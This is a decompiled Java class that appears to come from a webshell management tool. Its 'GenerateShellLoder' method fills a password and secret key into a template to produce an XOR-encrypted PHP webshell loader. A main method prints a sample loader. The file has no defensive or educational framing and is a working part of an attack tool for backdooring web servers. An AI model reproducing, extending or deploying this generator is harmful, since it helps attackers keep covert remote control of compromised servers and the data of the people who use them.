/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.phpXor;

import java.io.InputStream;
import util.Log;
import util.TemplateEx;
import util.functions;

class Generate {
    Generate() {
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        byte[] data = null;
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw.bin" : "base64.bin"));
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            code = TemplateEx.run(code);
            data = code.getBytes();
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    public static void main(String[] args) {
        System.out.println(new String(Generate.GenerateShellLoder("123", "456", false)));
    }
}

